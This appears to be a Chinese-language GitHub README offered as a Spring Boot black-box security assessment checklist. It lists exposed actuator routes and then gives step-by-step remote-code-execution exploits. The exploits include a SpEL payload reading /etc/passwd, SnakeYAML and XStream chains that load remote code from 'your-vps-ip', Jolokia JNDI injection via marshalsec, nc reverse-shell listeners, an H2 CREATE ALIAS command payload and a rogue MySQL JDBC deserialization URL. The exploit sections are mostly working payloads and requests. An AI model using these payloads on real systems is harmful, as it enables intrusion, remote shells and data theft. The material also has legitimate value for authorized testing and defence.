# Spring Boot Vulnerability Exploit CheckList

SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 checklist



## 零：路由知识

- spring boot 1.x 版本默认路由的根路径以  `/` 开始，2.x 统一以 `/actuator` 开始
- 有些程序员会自定义 `/manage`、`/management` 或 **项目相关名称** 为根路径
- 默认路由名字，如 `/env` 有时候也会被程序员修改，如修改成 `/appenv`





## 一：信息泄露

### 0x01：路由地址及接口调用详情泄漏

> 开发环境切换为线上生产环境时，相关人员没有更改配置文件或忘记切换配置环境，导致此漏洞
>



直接访问以下几个路由，验证漏洞是否存在：

```
/api-docs
/v2/api-docs
/swagger-ui.html
```

一些可能会遇到的接口路由变形：

```
/api.html
/sw/swagger-ui.html
/api/swagger-ui.html
/template/swagger-ui.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
```



除此之外，下面的路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：

```
/mappings
/actuator/mappings
/metrics
/actuator/metrics
/beans
/actuator/beans
/configprops
/actuator/configprops
```



**一般来讲，知道 springboot 应用的相关接口和传参信息并不能算是漏洞**；

但是可以检查暴露的接口是否存在未授权访问、越权或者其他业务型漏洞。



### 0x02：配置不当而暴露的路由

> 主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置



参考 [production-ready-endpoints](https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints) ，可能因为配置不当而暴露的路由主要有：

```
/actuator
/auditevents
/autoconfig
/beans
/caches
/conditions
/configprops
/docs
/dump
/env
/flyway
/health
/heapdump
/httptrace
/info
/intergrationgraph
/jolokia
/logfile
/loggers
/liquibase
/metrics
/mappings
/prometheus
/refresh
/scheduledtasks
/sessions
/shutdown
/trace
/threaddump
```



其中对寻找漏洞比较重要接口的有：

- /env

  GET 请求 `/env` 会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范 (例如 password 写成 psasword) 时，会泄露密码明文；

  同时有一定概率可以通过 POST 请求 `/env` 接口设置一些属性，触发相关 RCE 漏洞。

- /jolokia

  通过 `/jolokia/list` 接口寻找可以利用的 MBean，触发相关 RCE 漏洞；

- /trace

  一些 http 请求包访问跟踪信息，有可能发现有效的 cookie 信息



### 0x03：获取星号填充的密码明文





## 二：远程代码执行

> 由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准



### 0x01：whitelabel error page SpEL RCE

#### 利用条件：

- springboot < 1.2.8
- 至少知道一个触发 springboot 默认错误页面的接口及参数名



#### 利用方法：

##### 步骤一：找到一个正常传参处

比如发现访问  `/article?id=xxx` ，页面会报状态码为 500 的错误： `Whitelabel Error Page`，则后续 payload 都将会在参数 id 处尝试。



##### 步骤二：执行 SpEL 表达式

输入 `/article?id=A${7*7}A` ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。



```java
# 执行 cat /etc/passwd 命令并获得回显 payload SpEL 表达式

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x63,0x61,0x74,0x20,0x2f,0x65,0x74,0x63,0x2f,0x70,0x61,0x73,0x73,0x77,0x64})).getInputStream())}
```



#### 漏洞原理：

1. spring boot 处理参数值出错，流程进入显示默认 Whitelabel Error Page 500 错误页面
2. 此时 URL 中的参数值会用 SpEL 进行解析，其中携带的 SpEL 表达式就会被执行，造成 RCE 漏洞



#### 漏洞分析：

​	[RCE-Springs](https://deadpool.sh/2017/RCE-Springs/)





### 0x02：spring cloud SnakeYAML RCE

#### **利用条件：**

- 可以 POST 请求目标网站的 `/env` 接口设置属性
- 可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 spring-boot-starter-actuator 组件）
- 目标使用了 spring-cloud 相关组件
- 目标可以请求攻击者的 HTTP 服务器（请求可出外网）



#### **利用方法：**

##### 步骤一： 托管 yml 和 jar 文件

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```bash
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```



在网站根目录下放置后缀为 `yml` 的文件  `example.yml`，内容如下：

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://your-vps-ip/example.jar"]
  ]]
]
```



在网站根目录下放置后缀为 `jar` 的文件  `example.jar`，内容是要执行的代码，代码编写及编译方式参考 [yaml-payload](https://github.com/artsploit/yaml-payload)。



##### 步骤二： 设置 spring.cloud.bootstrap.location 属性

spring 1.x

```
POST /env HTTP/1.1
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
```

spring 2.x

```
POST /actuator/env HTTP/1.1
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/example.yml"}
```



##### 步骤三： 刷新配置

spring 1.x

```
POST /refresh HTTP/1.1
Content-Type: application/x-www-form-urlencoded

```

spring 2.x

```
POST /actuator/refresh HTTP/1.1
Content-Type: application/json

```



#### **漏洞原理：**

1. spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址
2. refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容
3. SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作
4. 先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件
5. 然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化
6. 实例化类时执行恶意代码，造成 RCE 漏洞



#### 漏洞分析：

​	[Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记](https://www.anquanke.com/post/id/195929)





### 0x03：XStream deserialization RCE

#### **利用条件：**

- 可以 POST 请求目标网站的 `/env` 接口设置属性
- 可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 spring-boot-starter-actuator 组件）
- 目标使用了 `Eureka-Client < 1.8.7`（通常包含在 spring-cloud-starter-netflix-eureka-client 中）组件
- 目标可以请求攻击者的 HTTP 服务器（请求可出外网）



#### **利用方法：**

##### 步骤一：架设响应恶意 XStream payload 的网站

提供一个依赖 Flask 并符合要求的 [python 脚本示例](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py)，作用是利用目标 Linux 机器上自带的 python 来反弹shell。

使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。



##### 步骤二：监听反弹 shell 的端口

一般使用 nc 监听端口，等待反弹 shell

```bash
nc -lvp 443
```



##### 步骤三：设置 eureka.client.serviceUrl.defaultZone 属性

spring 1.x

```
POST /env HTTP/1.1
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
```

spring 2.x

```
POST /actuator/env HTTP/1.1
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/example"}
```



##### 步骤四：刷新配置

spring 1.x

```
POST /refresh HTTP/1.1
Content-Type: application/x-www-form-urlencoded

```

spring 2.x

```
POST /actuator/refresh HTTP/1.1
Content-Type: application/json

```



#### **漏洞原理：**

1. eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址
2. refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload
3. 目标机器相关组件解析 payload，触发 XStream 反序列化，造成 RCE 漏洞



#### **漏洞分析：**

​	[Spring Boot Actuator从未授权访问到getshell](https://www.freebuf.com/column/234719.html)





### 0x04：Jolokia logback JNDI RCE

#### **利用条件：**

- 目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
- 目标使用了 jolokia-core 组件（版本要求暂未知）并且环境中存在相关 MBean
- 目标可以请求攻击者的 HTTP 服务器（请求可出外网）

- ldap 注入可能会受目标 JDK 版本影响，jdk < 6u201/7u191/8u182/11.0.1



#### **利用方法：**

##### 步骤一：查看已存在的 MBeans

访问 `/jolokia/list` 接口，查看是否存在 `ch.qos.logback.classic.jmx.JMXConfigurator` 和 `reloadByURL` 关键词。



##### 步骤二：托管 xml 文件

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）

```bash
# 使用 python 快速开启 http server

python2 -m SimpleHTTPServer 80
python3 -m http.server 80
```



在根目录放置以 `xml` 结尾的 `example.xml`  文件，内容如下：

```xml
<configuration>
  <insertFromJNDI env-entry-name="ldap://your-vps-ip:1389/JNDIObject" as="appName" />
</configuration>
```



##### 步骤三：准备要执行的 Java 代码

编写优化过后的用来反弹 shell 的 [Java 示例代码](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java)  `JNDIObject.java`，

使用兼容低版本 jdk 的方式编译：

```bash
javac -source 1.5 -target 1.5 JNDIObject.java
```

然后将生成的 `JNDIObject.class` 文件拷贝到 **步骤二** 中的网站根目录。



##### 步骤四：架设恶意 ldap 服务

下载 [marshalsec](https://github.com/mbechler/marshalsec) ，使用下面命令架设对应的 ldap 服务：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
```



##### 步骤五：监听反弹 shell 的端口

一般使用 nc 监听端口，等待反弹 shell

```bash
nc -lvp 443
```



##### 步骤六：从外部 URL 地址加载日志配置文件

替换实际的 your-vps-ip 地址访问 URL 触发漏洞：

```
/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml
```



#### **漏洞原理：**

1. 直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 `ch.qos.logback.classic.jmx.JMXConfigurator` 类的 `reloadByURL` 方法
2. 目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容
3. 目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)
4. xml 文件中利用 logback 组件的 `insertFormJNDI` 标签，设置了外部 JNDI 服务器地址
5. 目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞



#### **漏洞分析：**

​	[spring boot actuator rce via jolokia](https://xz.aliyun.com/t/4258)





### 0x05：Jolokia Realm JNDI RCE

#### **利用条件：**

- 目标网站存在 `/jolokia` 或 `/actuator/jolokia` 接口
- 目标使用了 jolokia-core 组件（版本要求暂未知）并且环境中存在相关 MBean
- 目标可以请求攻击者的 HTTP 服务器（请求可出外网）
- 实际测试 RMI 注入受目标 JDK 版本影响，jdk < 6u141/7u131/8u121



#### **利用方法：**

##### 步骤一：查看已存在的 MBeans

访问 `/jolokia/list` 接口，查看是否存在 `type=MBeanFactory` 和 `createJNDIRealm` 关键词。



##### 步骤二：准备要执行的 Java 代码

编写优化过后的用来反弹 shell 的 [Java 示例代码](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java)  `JNDIObject.java`。



##### 步骤三：架设恶意 rmi 服务

下载 [marshalsec](https://github.com/mbechler/marshalsec) ，使用下面命令架设对应的 rmi 服务：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389
```



##### 步骤四：监听反弹 shell 的端口

一般使用 nc 监听端口，等待反弹 shell

```bash
nc -lvp 443
```



##### 步骤五：发送恶意 payload

根据实际情况修改 [springboot-realm-jndi-rce.py](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py) 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。



#### **漏洞原理：**

1. 利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm
2. 设置 connectionURL 地址为 RMI Service URL
3. 设置 contextFactory 为 RegistryContextFactory
4. 停止 Realm
5. 启动 Realm 以触发指定 RMI 地址的  JNDI 注入，造成 RCE 漏洞



#### **漏洞分析：**

​	[Yet Another Way to Exploit Spring Boot Actuators via Jolokia](https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html)



### 0x06：h2 database query RCE

#### **利用条件：**

- 可以 POST 请求目标网站的 `/env` 接口设置属性
- 可以 POST 请求目标网站的 `/restart` 接口重启应用（存在 spring-boot-starter-actuator 组件）
- 存在 `com.h2database.h2` 依赖（版本要求暂未知）



#### 利用方法：

##### 步骤一：设置 spring.datasource.hikari.connection-test-query 属性

> ⚠️ 下面payload 中的 'T5' 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发



spring 1.x（无回显执行命令）

```
POST /env HTTP/1.1
Content-Type: application/x-www-form-urlencoded

spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');
```

spring 2.x（无回显执行命令）

```
POST /actuator/env HTTP/1.1
Content-Type: application/json

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');"}
```



##### 步骤二：重启应用

spring 1.x

```
POST /restart HTTP/1.1
Content-Type: application/x-www-form-urlencoded

```

spring 2.x

```
POST /actuator/restart HTTP/1.1
Content-Type: application/json

```



#### **漏洞原理：**

1. spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 `CREATE ALIAS` 创建自定义函数的 SQL 语句
2. 其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句
3. restart 重启应用，会建立新的数据库连接
4. 如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞



#### **漏洞分析：**

​	[remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)





### 0x07：mysql jdbc deserialization RCE

#### **利用条件：**

- 可以 POST 请求目标网站的 `/env` 接口设置属性
- 可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在 spring-boot-starter-actuator 组件）
- 目标环境中存在 `mysql-connector-java` 依赖
- 目标可以请求攻击者的服务器（请求可出外网）



#### **利用方法：**

##### 步骤一：查看环境依赖

GET 请求 `/env` 或 `/actuator/env`，搜索环境变量（classpath）中是否有 `mysql-connector-java`  关键词，并记录下其版本号（5.x 或 8.x）；

搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如  `commons-collections`、`Jdk7u21`、`Jdk8u20` 等；

搜索 `spring.datasource.url` 关键词，记录下其 `value`  值，方便后续恢复其正常 jdbc url 值。



##### 步骤二：架设恶意 rogue mysql server

在自己控制的服务器上运行 [springboot-jdbc-deserialization-rce.py](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py) 脚本，并使用 [ysoserial](https://github.com/frohoff/ysoserial) 自定义要执行的命令：

```bash
java -jar ysoserial.jar CommonsCollections3 calc > payload.ser
```

在脚本**同目录下**生成 `payload.ser` 反序列化 payload 文件，供脚本使用。



##### 步骤三：设置 spring.datasource.url 属性

> ⚠️ 修改此属性会暂时导致网站所有的正常数据库操作不可用，会对业务造成影响，请谨慎使用！



mysql-connector-java 5.x 版本设置**属性值**为：

```
jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
```

 mysql-connector-java 8.x 版本设置**属性值**为：

```
jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
```



spring 1.x

```
POST /env HTTP/1.1
Content-Type: application/x-www-form-urlencoded

spring.datasource.url=对应属性值
```

spring 2.x

```
POST /actuator/env HTTP/1.1
Content-Type: application/json

{"name":"spring.datasource.url","value":"对应属性值"}
```



##### 步骤四：刷新配置

spring 1.x

```
POST /refresh HTTP/1.1
Content-Type: application/x-www-form-urlencoded

```

spring 2.x

```
POST /actuator/refresh HTTP/1.1
Content-Type: application/json

```



##### 步骤五：触发数据库查询

尝试访问网站已知的数据库查询的接口，例如： `/product/list` ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发



##### 步骤六：恢复正常 jdbc url

反序列化漏洞利用完成后，使用 **步骤三** 的方法恢复 **步骤一** 中记录的 `spring.datasource.url` 的原始 `value` 值



#### **漏洞原理：**

1. spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址
2. refresh 刷新后设置了一个新的 spring.datasource.url 属性值
3. 当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接
4. 然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据
5. 目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞



#### **漏洞分析：**

​	[New-Exploit-Technique-In-Java-Deserialization-Attack](https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf)


